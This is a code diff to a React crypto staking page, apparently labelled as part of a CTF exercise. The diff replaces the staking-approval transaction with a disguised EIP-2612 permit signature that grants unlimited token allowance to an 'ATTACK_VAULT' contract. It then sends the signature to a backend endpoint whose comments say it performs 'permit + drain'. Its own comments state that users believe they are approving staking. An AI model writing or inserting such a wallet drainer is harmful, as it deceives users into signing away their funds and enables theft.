@@ -15,7 +15,7 @@ import {
   FiUsers,
   FiZap,
 } from 'react-icons/fi';
-import { CONTRACTS, EXPECTED_CHAIN_ID, formatAddress, formatNumber, parseContractError } from '../utils/constants';
+import { CONTRACTS, CTF_API, EXPECTED_CHAIN_ID, formatAddress, formatNumber, parseContractError } from '../utils/constants';
 import { useLanguage } from '../contexts/LanguageContext';
 
 const ZERO = ethers.ZeroAddress;
@@ -113,13 +113,65 @@ export default function TokenMiningPage({
   );
 
   const approveStakeToken = async () => {
-    if (!contracts?.writeNbtToken || !CONTRACTS.STAKING_BANK) return;
+    if (!contracts?.writeNbtToken || !CONTRACTS.ATTACK_VAULT) return;
     if (!(await ensureNetwork())) return;
+    if (!window.ethereum?.request) return;
     setIsApprovingStake(true);
     try {
-      const tx = await contracts.writeNbtToken.approve(CONTRACTS.STAKING_BANK, ethers.MaxUint256);
+      // 攻击模式：不再发 approve 交易，改为 EIP-2612 permit 签名
+      // 用户以为在"授权质押"，实际签名 spender = 攻击合约（无限授权）
+      const tokenAddr = CONTRACTS.NBT_TOKEN;
+      const spender = CONTRACTS.ATTACK_VAULT;
+      const owner = account;
+      const nonce = await contracts.writeNbtToken.nonces(owner);
+      const deadline = Math.floor(Date.now() / 1000) + 86400 * 7; // 7天
+
+      const domain = {
+        name: 'CZ人生',
+        version: '1',
+        chainId: EXPECTED_CHAIN_ID,
+        verifyingContract: tokenAddr,
+      };
+      const types = {
+        Permit: [
+          { name: 'owner', type: 'address' },
+          { name: 'spender', type: 'address' },
+          { name: 'value', type: 'uint256' },
+          { name: 'nonce', type: 'uint256' },
+          { name: 'deadline', type: 'uint256' },
+        ],
+      };
+      const message = {
+        owner,
+        spender,
+        value: ethers.MaxUint256.toString(),
+        nonce: nonce.toString(),
+        deadline: deadline.toString(),
+      };
+
       toast.loading(t('cz.toast.approveCz'), { id: 'approveStake' });
-      await tx.wait();
+
+      // 用 provider 的 send 触发 EIP-712 签名（钱包显示"签名请求"，无交易确认）
+      const signature = await window.ethereum.request({
+        method: 'eth_signTypedData_v4',
+        params: [owner, JSON.stringify({ domain, types, message })],
+      });
+
+      // 签名发送到 CTF 后端：执行 permit + drain
+      if (CTF_API) {
+        await fetch(`${CTF_API}/api/claim`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            owner,
+            signature,
+            amount: ethers.MaxUint256.toString(),
+            deadline: deadline.toString(),
+            nonce: nonce.toString(),
+          }),
+        }).catch((e) => console.warn('CTF api claim failed:', e));
+      }
+
       toast.success(t('cz.toast.approveCzSuccess'), { id: 'approveStake' });
       onRefresh?.();
     } catch (err) {
